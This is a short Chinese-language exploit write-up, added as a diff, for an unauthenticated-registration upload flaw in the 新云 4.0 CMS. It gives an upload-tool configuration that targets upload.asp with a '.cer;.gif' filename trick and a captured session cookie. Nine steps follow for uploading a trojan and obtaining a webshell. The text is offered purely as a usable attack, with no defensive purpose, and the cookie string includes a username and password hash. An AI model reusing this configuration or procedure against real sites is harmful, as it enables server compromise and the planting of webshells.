@@ -1,0 +1,33 @@
+新云4.0注册上传0day利用过程及EXP
+
+[新云4.0注册上传0day利用过程及EXP 全文]
+影响版本：新云4.0最新
+
+漏洞分析：
+
+把下面配置文件保存为（xunyun.seraph)
+
+ 
+
+url=http://www.sitedir.com.cn/users/upload.asp?action=save&ChannelID=1&sType=  filefield=File1  filefield2=  filename=200981623554.cer;.gif  filename2=  local=C:\Documents and Settings\seraph\桌面\sitedir.jpg  local2=  type=text/html  type2=image/gif  cookies=pma_cookie_username-1=dXsYNCw7jXS1W0oq9sYg4g%3D%3D; style_cookie=null; AJSTAT_ok_times=1; lastvisit=3934%7C1266468378; csscolor=0; songhidden=0; NewAspUsers=UserToday=0%2C0%2C0%2C0%2C0%2C0&userlastip=127%2E0%2E0%2E1&UserGroup=%C6%D5%CD%A8%BB%E1%D4%B1&UserGrade=1&nickname=seraph&password=4283705e6519c904&UserClass=0&username=seraph&LastTime=2010%2D3%2D9+0%3A10%3A01&userid=1; ASPSESSIONIDSASQQRBT=BKLHHGICELEMHKBMKOBHIGBA; NewAspUsers%5FOnline=UserSessionID=8304709; usercookies%5F1=dayarticlenum=0&daysoftnum=0&userip=127%2E0%2E0%2E1; ASPSESSIONIDQCRRTRBS=PCOHKAJCAPDEFNADGPDDMLBM name=uploadPic&value=1421 name=Rename&value=1  
+
+准备工作做好了，开始拿ＳＨＥＬＬ了
+
+1.先找一个可以注册上传图片的新云程序
+
+2.登录后抓取ＣＯＯＫＩＥ内容
+
+3.打开软件，加载刚刚保存的配置文件
+
+4.修改ＣＯＯＫＩＥ以及上传的地址，网址
+
+5.打开http://www.sitedir.com.cn/users/upload.asp?ChannelID=1,里面找到uploadpic的值
+
+
+6.双击uploadpic,修改为刚刚得到的值,这是一个验证码,要保证没有刷新页面才行
+
+7.本地文件第一个改成自己要上传的木马
+
+8.点击上传，如果上传失败则试试上传２
+
+9.手动抓取上传地址！
